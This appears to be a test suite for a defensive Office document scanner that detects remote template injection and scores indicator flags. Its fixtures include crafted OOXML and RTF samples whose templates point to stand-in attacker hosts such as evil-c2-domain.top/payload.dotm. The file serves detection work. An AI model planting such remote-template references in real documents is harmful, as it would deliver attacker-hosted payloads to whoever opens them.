"""Tests for the Office document analysis package.

doc_analysis is six passes over three container formats, joined by a flat set
of indicator flags that the combo scoring engine reads. These tests work at
that seam: they drive individual passes with crafted containers and assert on
the flags, because the flags are the only thing that reaches the score.
"""

import zipfile

import pytest

from modules.static.doc_analysis.routing import detect_format
from modules.static.doc_analysis.scoring import COMBO_RULES, score_document
from modules.static.doc_analysis.template_inject import (
    _extract_attr,
    analyse_openxml_rels,
    analyse_rtf_template,
)

_RELS = (
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
    '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
    "<Relationship Id={q}rId1{q} "
    "Type={q}http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate{q} "
    "Target={q}http://evil-c2-domain.top/payload.dotm{q} TargetMode={q}External{q}/>"
    "</Relationships>"
)


def _docx(tmp_path, rels: str, name: str = "sample.docx"):
    """Build a minimal OOXML container carrying *rels*."""
    p = tmp_path / name
    with zipfile.ZipFile(p, "w") as z:
        z.writestr("[Content_Types].xml", "<Types/>")
        z.writestr("word/document.xml", "<w:document/>")
        z.writestr("word/_rels/document.xml.rels", rels)
    return p


# ----------------------------------------------------------------------
# Format routing
# ----------------------------------------------------------------------

def test_rtf_behind_a_doc_extension_routes_as_rtf(tmp_path):
    """The disguise this module exists to see through."""
    p = tmp_path / "AgentTesla.doc"
    p.write_bytes(rb"{\rtf1\ansi{\*\template http://evil.tld/t.dotm}}")
    assert detect_format(p) == "rtf"


def test_ole_and_openxml_are_distinguished(tmp_path):
    ole = tmp_path / "a.doc"
    ole.write_bytes(b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 32)
    zipped = tmp_path / "b.docx"
    zipped.write_bytes(b"PK\x03\x04" + b"\x00" * 32)
    assert detect_format(ole) == "ole"
    assert detect_format(zipped) == "openxml"


# ----------------------------------------------------------------------
# Template injection — OOXML relationships
# ----------------------------------------------------------------------

def test_external_template_to_a_non_microsoft_host_is_flagged(tmp_path):
    out = analyse_openxml_rels(_docx(tmp_path, _RELS.format(q='"')))
    assert "template_inject_high" in out["indicator_flags"]
    assert "template_inject_non_ms" in out["indicator_flags"]
    assert out["external_relationships"][0]["non_microsoft_url"] is True


def test_single_quoted_attributes_are_read(tmp_path):
    """XML permits either quote style; Word accepts both.

    Matching only double quotes meant a .rels written with single quotes
    produced no relationships at all — no target parsed, no external
    check, no flags — while Word still fetched the remote template.
    """
    out = analyse_openxml_rels(_docx(tmp_path, _RELS.format(q="'")))
    assert "template_inject_high" in out["indicator_flags"]
    assert "template_inject_non_ms" in out["indicator_flags"]
    assert out["external_relationships"][0]["target"] == (
        "http://evil-c2-domain.top/payload.dotm"
    )


def test_both_quote_styles_agree(tmp_path):
    double = analyse_openxml_rels(_docx(tmp_path, _RELS.format(q='"'), "d.docx"))
    single = analyse_openxml_rels(_docx(tmp_path, _RELS.format(q="'"), "s.docx"))
    assert double["indicator_flags"] == single["indicator_flags"]
    assert double["external_relationships"] == single["external_relationships"]


def test_microsoft_hosted_template_is_not_flagged_as_external_host(tmp_path):
    rels = _RELS.format(q='"').replace(
        "http://evil-c2-domain.top/payload.dotm",
        "https://company.sharepoint.com/normal.dotm",
    )
    out = analyse_openxml_rels(_docx(tmp_path, rels))
    assert "template_inject_non_ms" not in out["indicator_flags"]


def test_attribute_extraction_handles_either_quote_style():
    tag = "<Relationship Target='http://a.tld/x' Type=\"http://b/type\"/>"
    assert _extract_attr(tag, "Target") == "http://a.tld/x"
    assert _extract_attr(tag, "Type") == "http://b/type"


def test_attribute_names_are_matched_case_insensitively():
    """Read at least as permissively as the application being protected.

    The pre-existing TargetMode test was a case-folded substring search, so
    narrowing to a case-sensitive attribute match would have been a free
    evasion if any Office version ever accepted the variant casing.
    """
    tag = "<Relationship TARGET='http://a.tld/x' targetmode='External'/>"
    assert _extract_attr(tag, "Target") == "http://a.tld/x"
    assert _extract_attr(tag, "TargetMode") == "External"


def test_target_does_not_match_targetmode():
    tag = "<Relationship TargetMode=\"External\"/>"
    assert _extract_attr(tag, "Target") == ""


def test_missing_attribute_yields_empty_string():
    assert _extract_attr("<Relationship Id='rId1'/>", "Target") == ""


# ----------------------------------------------------------------------
# Template injection — RTF
# ----------------------------------------------------------------------

def test_remote_rtf_template_is_flagged():
    out = analyse_rtf_template(rb"{\rtf1{\*\template http://evil.tld/t.dotm}}")
    assert out["templates"][0]["remote"] is True
    assert "template_inject_non_ms" in out["indicator_flags"]


def test_local_rtf_template_is_recorded_but_not_flagged():
    """A local template target is how the feature legitimately works."""
    out = analyse_rtf_template(rb"{\rtf1{\*\template C:\\Normal.dotm}}")
    assert out["templates"]
    assert out["indicator_flags"] == set()


# ----------------------------------------------------------------------
# Scoring engine
# ----------------------------------------------------------------------

def test_combination_outscores_its_parts():
    """The engine prices delivery, not just artefacts."""
    alone, _, _ = score_document({"auto_exec"})
    combo, _, _ = score_document({"auto_exec", "shell_keyword"})
    assert combo > alone


def test_classification_bands():
    assert score_document(set())[2] == "CLEAN"
    assert score_document({"malformed_openxml"})[2] == "INFORMATIONAL"
    assert score_document({"altchunk"})[2] == "SUSPICIOUS"
    assert score_document({"auto_exec", "shell_keyword"})[2] == "MALICIOUS"


def test_unknown_flags_are_ignored():
    assert score_document({"not_a_real_flag"}) == (0, [], "CLEAN")


def _flags_emitted_by_the_package() -> set[str]:
    """Every indicator flag any pass can add, read off the AST.

    Parsed rather than grepped: a regex over source text matches
    commented-out lines, misses whichever quote style it was not written
    for, and silently ignores anything it does not recognise — which is
    the exact failure mode the test below exists to prevent.

    Literal ``out["indicator_flags"].add("x")`` and ``.update({...})``
    calls come from the AST. The one dynamic site — ole_objects looping
    over _HIGH_RISK_CLASS_SUBSTRINGS and adding its values — is unioned in
    from the table itself, since no static walk can resolve it, and the
    walk asserts that it remains the *only* such site.

    Known limits, since a test that quietly stops checking is worse than
    no test: a flag added through a differently-named alias (the set
    passed into a helper as a parameter) or built by string arithmetic
    would be invisible here. Both are outside how this package is
    written, and the assertion on dynamic sites below is what would catch
    the drift.
    """
    import ast
    import pathlib

    from modules.static.doc_analysis.ole_objects import _HIGH_RISK_CLASS_SUBSTRINGS

    def _targets_indicator_flags(node: ast.AST) -> bool:
        """True if *node* is the indicator_flags set, however it is reached."""
        if isinstance(node, ast.Subscript):
            key = node.slice
            return isinstance(key, ast.Constant) and key.value == "indicator_flags"
        if isinstance(node, ast.Name):
            return node.id == "indicator_flags"
        if isinstance(node, ast.Attribute):
            return node.attr == "indicator_flags"
        return False

    def _literals(arg: ast.AST) -> list[str] | None:
        """String literals in *arg*, or None if it is not statically known."""
        if isinstance(arg, ast.Constant) and isinstance(arg.value, str):
            return [arg.value]
        # .update() takes an iterable, so a literal collection is readable.
        if isinstance(arg, (ast.Set, ast.List, ast.Tuple)):
            out: list[str] = []
            for element in arg.elts:
                if not (isinstance(element, ast.Constant)
                        and isinstance(element.value, str)):
                    return None
                out.append(element.value)
            return out
        return None

    emitted: set[str] = set(_HIGH_RISK_CLASS_SUBSTRINGS.values())
    dynamic: set[str] = set()
    for module in pathlib.Path("modules/static/doc_analysis").glob("*.py"):
        tree = ast.parse(module.read_text())
        for node in ast.walk(tree):
            if not isinstance(node, ast.Call):
                continue
            func = node.func
            # Both mutating set methods, not just add — .update({...}) would
            # otherwise sail past this walk with its flags uncounted.
            if not isinstance(func, ast.Attribute) or func.attr not in ("add", "update"):
                continue
            if not _targets_indicator_flags(func.value):
                continue
            for arg in node.args:
                found = _literals(arg)
                if found is None:
                    # Name it, so the assertion below says which site drifted.
                    dynamic.add(getattr(arg, "id", type(arg).__name__))
                else:
                    emitted.update(found)

    # The single dynamic site is ole_objects looping over
    # _HIGH_RISK_CLASS_SUBSTRINGS and adding its `flag` values, already
    # unioned in above. Any other one is unaccounted for and this fails.
    assert dynamic == {"flag"}, (
        f"unaccounted dynamic indicator_flags sites: {sorted(dynamic)}"
    )
    return emitted


def test_every_emitted_flag_is_scored():
    """A flag no rule mentions is a detection that goes nowhere.

    Five flags were emitted and never scored — packager_shell,
    shell_explorer, htmlfile, ole_package and altchunk_absolute_path — so
    a Packager Shell object or a Shell.Explorer control embedded in a
    document contributed exactly zero. Nothing errors in that situation
    and nothing logs, which is why it needs a test rather than a review.
    """
    emitted = _flags_emitted_by_the_package()
    scored = set().union(*(rule[0] for rule in COMBO_RULES))
    assert emitted - scored == set(), (
        f"flags emitted but never scored: {sorted(emitted - scored)}"
    )


def test_the_flag_walk_finds_the_known_flags():
    """Guards the walker itself — an empty result would pass the test above."""
    emitted = _flags_emitted_by_the_package()
    assert {"auto_exec", "vba_stomping", "altchunk", "template_inject_non_ms",
            "shell_explorer"} <= emitted
    assert len(emitted) >= 20


@pytest.mark.parametrize(
    "flag",
    ["packager_shell", "shell_explorer", "htmlfile", "ole_package",
     "altchunk_absolute_path"],
)
def test_previously_unscored_flags_now_contribute(flag):
    assert score_document({flag})[0] > 0


def test_absolute_path_altchunk_outscores_a_plain_one():
    """An altChunk resolving outside the container is the weaponised form."""
    plain, _, _ = score_document({"altchunk"})
    absolute, _, _ = score_document({"altchunk", "altchunk_absolute_path"})
    assert absolute > plain


def test_package_with_an_executable_outscores_a_bare_package():
    bare, _, _ = score_document({"ole_package"})
    with_exe, _, _ = score_document({"ole_package", "ole_package_exec_ext"})
    assert with_exe > bare


def test_rules_are_ordered_by_descending_weight():
    """The module documents this order and the reason strings rely on it.

    A truncated report shows the first few reasons, so the list has to run
    highest-weight first for the ones it keeps to be the ones that carried
    the score. Nothing enforces that when a rule is inserted by hand.
    """
    weights = [rule[1] for rule in COMBO_RULES]
    assert weights == sorted(weights, reverse=True)


def test_score_is_capped_but_classification_is_not():
    everything = set().union(*(rule[0] for rule in COMBO_RULES))
    delta, _, classification = score_document(everything)
    assert delta == 60
    assert classification == "MALICIOUS"
